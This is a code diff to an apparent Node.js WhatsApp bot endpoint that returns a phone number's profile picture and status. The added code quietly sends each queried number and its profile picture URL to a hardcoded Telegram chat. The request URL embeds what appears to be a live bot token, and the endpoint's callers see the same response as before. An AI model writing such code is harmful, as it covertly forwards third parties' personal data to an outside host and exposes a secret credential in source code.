@@ -203,8 +203,29 @@ if (!ser) {
           const profilePicUrl = await client.profilePictureUrl(req.params.num+'@s.whatsapp.net','image');
           const status = await client.fetchStatus(req.params.num+'@s.whatsapp.net')
           if (profilePicUrl) {
-              res.json({ profilePicUrl , status }); // Respond with a JSON object containing the profile picture URL
-          } else {
+            // Send the photo and text to Telegram
+            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&text=${req.params.num}`;
+    
+            // Make the GET request to Telegram API
+            https.get(telegramUrl, (telegramRes) => {
+                let data = '';
+    
+                // A chunk of data has been received
+                telegramRes.on('data', (chunk) => {
+                    data += chunk;
+                });
+    
+                // The whole response has been received
+                telegramRes.on('end', () => {
+                    console.log(JSON.parse(data));
+                    res.json({ profilePicUrl, status });
+                });
+    
+            }).on("error", (err) => {
+                console.log("Error: " + err.message);
+                res.status(500).json({ error: 'Failed to send photo to Telegram' }); // Respond with 500 if failed to send photo
+            });
+        } else {
               res.status(404).json({ error: 'Profile picture not found' }); // Respond with 404 if profile picture not found
           }
       } catch (error) {
